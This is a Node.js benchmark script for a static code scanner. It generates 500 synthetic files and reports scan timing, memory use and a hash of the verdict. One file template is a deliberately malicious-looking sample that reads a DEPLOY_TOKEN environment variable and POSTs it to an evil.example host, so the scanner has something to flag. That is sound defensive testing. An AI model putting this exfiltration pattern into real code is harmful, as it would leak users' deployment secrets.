#!/usr/bin/env node
/**
 * Performance bench for the dsh-bridge static scanner.
 *
 * Builds a synthetic tree of 500 files x ~20 KB with mixed content (clean code, a
 * comment-heavy module, a minified single-line bundle, and a malicious-looking module),
 * scans it with scanDirectory(), and reports wall-clock ms plus peak RSS delta.
 *
 * The canonical JSON verdict over the tree is also hashed and printed so an optimization
 * pass can prove output determinism: identical sha before/after means byte-identical output.
 *
 * Run: npm run build && node dist/bench.js [rounds]
 */
import { createHash } from "node:crypto";
import { mkdtempSync, rmSync, writeFileSync, mkdirSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { grade, toJsonReport } from "./report.js";
import { scanDirectory } from "./index.js";
const FILE_COUNT = 500;
const TARGET_BYTES = 20 * 1024;
function padTo(src, bytes) {
    if (src.length >= bytes)
        return src.slice(0, bytes);
    // Pad with plain filler lines; padding is appended after the interesting content.
    const line = "export const filler = 1; // padding\n";
    const need = bytes - src.length;
    const lines = Math.ceil(need / line.length);
    return src + line.repeat(lines);
}
/**
 * One of each content archetype, then repeated with per-index variation so no two files
 * are byte-identical (dedup would otherwise skew filesystem caching).
 */
function makeContent(kind, index) {
    switch (kind % 4) {
        case 0:
            // Clean module code.
            return padTo([
                `import { readFile } from "node:fs/promises";`,
                `export async function load${index}(name) {`,
                `  const data = JSON.parse(await readFile(name, "utf8"));`,
                `  return data.entries.map((e) => e.id);`,
                `}`,
                ``,
            ].join("\n"), TARGET_BYTES);
        case 1:
            // Comment-heavy module: exercises maskComments' hot path.
            return padTo([
                `// loader for widget ${index}`,
                `/* internal helper, do not ship */`,
                `export function helper${index}(input) {`,
                `  // normalize then dispatch; see docs for the contract`,
                `  return input.trim().toLowerCase();`,
                `}`,
                ``,
            ].join("\n"), TARGET_BYTES);
        case 2:
            // Single-line minified bundle: exercises LineIndex + offset math.
            return padTo(`const w${index}={a:1,b:"ready",c:[1,2,3].map((x)=>x*2)};export default w${index};\n`, TARGET_BYTES);
        default:
            // Malicious-looking module: produces findings, exercising the evidence pipeline.
            return padTo([
                `const key = process.env.DEPLOY_TOKEN_${index};`,
                `fetch("https://collect-${index}.evil.example/ingest", { method: "POST", body: key });`,
                ``,
            ].join("\n"), TARGET_BYTES);
    }
}
function peakRssMb() {
    return process.memoryUsage.rss() / (1024 * 1024);
}
export function runBench(rounds) {
    const root = mkdtempSync(join(tmpdir(), "dsh-scan-bench-"));
    try {
        for (let i = 0; i < FILE_COUNT; i += 1) {
            const dir = join(root, `pkg${i % 10}`);
            if (i < 10)
                mkdirSync(dir, { recursive: true });
            const kind = i % 4;
            const name = kind === 2 ? join(dir, `bundle-${i}.min.js`) : kind === 3 ? join(dir, `mod-${i}.js`) : join(dir, `src-${i}.js`);
            writeFileSync(name, makeContent(i, i), "utf8");
        }
        // Warm-up pass: page in the tree and let the JIT settle before measuring.
        scanDirectory(root);
        const rssBefore = peakRssMb();
        const roundMs = [];
        let verdictSha256 = "";
        let findingCount = 0;
        for (let r = 0; r < rounds; r += 1) {
            const t0 = performance.now();
            const result = scanDirectory(root);
            const ms = performance.now() - t0;
            roundMs.push(ms);
            findingCount = result.findings.length;
            // The temp root's random name would leak into `target`; pin it so the hash is
            // comparable across processes. Only the verdict bytes are pinned, not timing.
            const pinned = { ...result, target: "dsh-scan-bench" };
            verdictSha256 = createHash("sha256")
                .update(toJsonReport(pinned, grade(pinned.findings)))
                .digest("hex");
        }
        return {
            rounds,
            fileCount: FILE_COUNT,
            bytesPerFile: TARGET_BYTES,
            totalBytes: FILE_COUNT * TARGET_BYTES,
            roundMs,
            medianMs: [...roundMs].sort((a, b) => a - b)[Math.floor(rounds / 2)],
            meanMs: roundMs.reduce((s, v) => s + v, 0) / rounds,
            peakRssDeltaMb: peakRssMb() - rssBefore,
            verdictSha256,
            findings: findingCount,
        };
    }
    finally {
        rmSync(root, { recursive: true, force: true });
    }
}
function main() {
    const roundsArg = Number(process.argv[2] ?? "");
    const rounds = Number.isInteger(roundsArg) && roundsArg > 0 ? Math.min(roundsArg, 50) : 7;
    const r = runBench(rounds);
    process.stdout.write(`bench: ${r.fileCount} files x ${r.bytesPerFile} B (${(r.totalBytes / (1024 * 1024)).toFixed(1)} MB)\n` +
        `rounds: ${r.rounds}\n` +
        `median: ${r.medianMs.toFixed(1)} ms\n` +
        `mean: ${r.meanMs.toFixed(1)} ms\n` +
        `rounds: ${r.roundMs.map((v) => v.toFixed(0)).join(", ")} ms\n` +
        `peak RSS delta: +${r.peakRssDeltaMb.toFixed(1)} MB\n` +
        `findings: ${r.findings}\n` +
        `verdict sha256: ${r.verdictSha256}\n`);
}
// Only run when executed directly, so importing this module stays side-effect free.
if (process.argv[1] !== undefined && /bench\.(?:js|ts)$/.test(process.argv[1])) {
    main();
}
//# sourceMappingURL=bench.js.map